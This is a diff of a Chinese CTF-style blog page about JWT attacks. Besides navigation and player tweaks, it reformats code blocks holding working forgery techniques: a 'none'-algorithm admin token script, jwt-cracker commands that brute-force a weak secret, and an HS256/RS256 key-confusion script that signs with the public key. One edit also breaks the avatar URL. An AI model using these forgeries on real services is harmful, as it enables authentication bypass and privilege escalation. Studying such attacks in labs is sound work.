@@ -73,7 +73,7 @@
     <div class="focusinfo no-select">
       <div class="header-tou">
         <a href="https://s1rius.github.io">
-          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
         </a>
       </div>
       <div class="header-info">
@@ -220,16 +220,6 @@
               </li>
             
               <li>
-                <a href="/comment/">
-                  <span class="faa-parent animated-hover">
-                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
-                    留言板
-                  </span>
-                </a>
-                
-              </li>
-            
-              <li>
                 <a href="/links/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -250,23 +240,12 @@
               </li>
             
               <li>
-                <a href="/">
+                <a href="/about/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                     关于
                   </span>
                 </a>
-                
-                  <ul class="sub-menu">
-                    
-                      <li>
-                        <a href="/about/">
-                          <i class="fa fa-meetup" aria-hidden="true"></i>
-                          我
-                        </a>
-                      </li>
-                    
-                  </ul>
                 
               </li>
             
@@ -321,7 +300,17 @@
 <p>然后在</p>
 <p><a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a></p>
 <p>decode    一共两部分ag是另一半<br><img src="https://img-blog.csdnimg.cn/a4b0f89e87f84f8aa21b3071ec99c066.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">algorithm=<span class="string">"none"</span></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"role"</span>:<span class="string">"admin"</span></span><br><span class="line">  &#125;</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line">encoded = jwt.encode(payload,key,algorithm)</span><br><span class="line">print(encoded)</span><br></pre></td></tr></table></figure>
+<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><pre><code class="python">import jwt
+algorithm=&quot;none&quot;
+payload = {
+  &quot;username&quot;: &quot;admin&quot;,
+  &quot;password&quot;: &quot;admin&quot;,
+  &quot;role&quot;:&quot;admin&quot;
+  }
+key = &quot;&quot;
+encoded = jwt.encode(payload,key,algorithm)
+print(encoded)
+</code></pre>
 <p>jwt的签名可以为无</p>
 <blockquote>
 <p>今天写这个脚本的时候命名为jwt.py</p>
@@ -333,7 +322,11 @@
 <p>把cookie里的token改为这脚本的运行结果</p>
 <h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">jwt-cracker</a></p>
 <p>依次执行即可</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./c-jwt-cracker</span><br><span class="line">make</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">git clone https://github.com/brendan-rius/c-jwt-cracker
+./c-jwt-cracker
+make
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs
+</code></pre>
 <p>然后得出该jwt密钥</p>
 <p>然后放之前那个网站</p>
 <p>改role为admin</p>
@@ -353,7 +346,34 @@
 <p>这题就先用大神的脚本吧</p>
 <p>我太菜了</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=GBK</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'publickey.pem'</span>)<span class="comment">#需要将文中的publickey下载	与脚本同目录</span></span><br><span class="line">key = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Paste your header and payload here</span></span><br><span class="line">header = <span class="string">'&#123;"typ": "JWT", "alg": "HS256"&#125;'</span></span><br><span class="line">payload = <span class="string">'&#123;"username": "admin", "role": "admin"&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded header</span></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">encodeHeader = str(encodeHBytes, <span class="string">"utf-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded payload</span></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">encodePayload = str(encodePBytes, <span class="string">"utf-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Concatenating header and payload</span></span><br><span class="line">token = (encodeHeader + <span class="string">"."</span> + encodePayload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating signature</span></span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, <span class="string">"UTF-8"</span>), token.encode(<span class="string">"utf-8"</span>), hashlib.sha256).digest()).decode(<span class="string">"UTF-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line">print(token + <span class="string">"."</span> + sig)</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># coding=GBK
+import hmac
+import hashlib
+import base64
+
+file = open(&#39;publickey.pem&#39;)#需要将文中的publickey下载    与脚本同目录
+key = file.read()
+
+# Paste your header and payload here
+header = &#39;{&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;}&#39;
+payload = &#39;{&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}&#39;
+
+# Creating encoded header
+encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))
+encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)
+
+# Creating encoded payload
+encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))
+encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)
+
+# Concatenating header and payload
+token = (encodeHeader + &quot;.&quot; + encodePayload)
+
+# Creating signature
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)
+
+print(token + &quot;.&quot; + sig)
+</code></pre>
 <p>运行后把token返回去验证</p>
 <p>成功</p>
 <p><img src="https://img-blog.csdnimg.cn/169a632c18eb4233a605602f6f6b9cde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/cbb9f91b8d69482283ce362d1407284f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
@@ -590,7 +610,7 @@ $(document).ready(function() {
   </section>
   <div id="mo-nav" class="">
   <div class="m-avatar">
-    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
   </div>
   <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">s1rius's blog</p>
   <p style="text-align: center; word-spacing: 20px;">
@@ -650,16 +670,6 @@ $(document).ready(function() {
       </li>
     
       <li>
-        <a href="/comment/">
-          <span class="faa-parent animated-hover">
-            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
-            留言板
-          </span>
-        </a>
-        
-      </li>
-    
-      <li>
         <a href="/links/">
           <span class="faa-parent animated-hover">
             <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -680,23 +690,12 @@ $(document).ready(function() {
       </li>
     
       <li>
-        <a href="/">
+        <a href="/about/">
           <span class="faa-parent animated-hover">
             <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
             关于
           </span>
         </a>
-        
-          <ul class="sub-menu">
-            
-              <li>
-                <a href="/about/">
-                  <i class="fa fa-meetup" aria-hidden="true"></i>
-                  我
-                </a>
-              </li>
-            
-          </ul>
         
       </li>
     
@@ -752,7 +751,7 @@ $(document).ready(function() {
 
     preload="auto"
 
-    volume="0.7"
+    volume="0.3"
 
     mutex="true"
 
